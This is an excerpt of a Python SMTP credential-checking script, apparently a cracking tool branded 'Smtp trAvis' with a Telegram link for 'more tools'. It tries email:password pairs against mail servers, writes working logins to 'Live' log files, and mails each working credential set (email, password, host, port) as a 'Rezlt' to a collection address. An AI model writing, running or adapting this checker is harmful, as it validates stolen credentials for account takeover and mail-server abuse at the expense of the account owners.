...
def checker_ssl(user, passw):
    ...
    while True:
        ...
        if os.name == 'nt':
            ctypes.windll.kernel32.SetConsoleTitleW('Smtp trAvis Ch |By Kira |ToTal Users- {}|Live- {} |Die- {}'.format(totalnum, live, die))
        else:
            sys.stdout.write('\x1b]2;Smtp trAvis Ch |By Kira |ToTal Users- {}|Live- {} |Die- {}\x07'.format(totalnum, live, die))


        # ctypes.windll.kernel32.SetConsoleTitleW('Smtp valid Ch |By travis |ToTal Users- {}|Live- {} |Die- {}'.format(totalnum, live, die))
        ...
        try:
            ...
            subj = 'New Rezlt | Smtp travis'
            date = datetime.datetime.now().strftime('%d/%m/%Y %H:%M')
            if '@' not in user:
                froma = user + '@Smtp-trAvis.com'
            else:
                froma = user
            from_addr = froma
            to_addr = str(email)
            ...
            f = open('trAvis-Log/Live-{}.txt'.format(host), 'a')
            f.write('LIVE => %s:%s\n' % (user, passw))
            live += 1
        except Exception as f:
            f = open('trAvis-Log/Die-{}.txt'.format(host), 'a')
            f.write('Die => %s:%s\n' % (user, passw))
            die += 1
...
def checker_(user, passw):
    ...
    while True:
        ...
        try:
            ...
            from_addr = froma
            to_addr = str(email)
            message_text = '+++++++++ Rezlt information +++++++++\n[+] E-mail : {}\n[+] E-mail Password : {}\n[+] Host : {}\n[+] Port : {}\n[+] SSL/TLS : Off\n+++++++++ Smtp trAvis +++++++++'.format(user, passw, host, port)
            msg = 'From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s' % (from_addr, to_addr, subj, date, message_text)
            mailserver.sendmail(from_addr, to_addr, msg)
            mailserver.quit()
            print(' {}[+] Live{} ==> {}:{}'.format(fg, sb, user, passw))
...
def thread():
    ...
    global totalnum
    global user
    x = '\n\t\t\t\x1b[1;36m \x1b[0;m            \x1b[1;41m Smtp trAvis Script ! Coded By lihwak Lag !\x1b[0;m   \x1b[1;36m  \x1b[0;m'
    ...
    xxxx = '\t\t\x1b[1;36m \x1b[0;m              \x1b[1;41mMore Tools --> ( https://t.me/thamatrx )\x1b[0;m   \x1b[1;36m  \x1b[0;m'
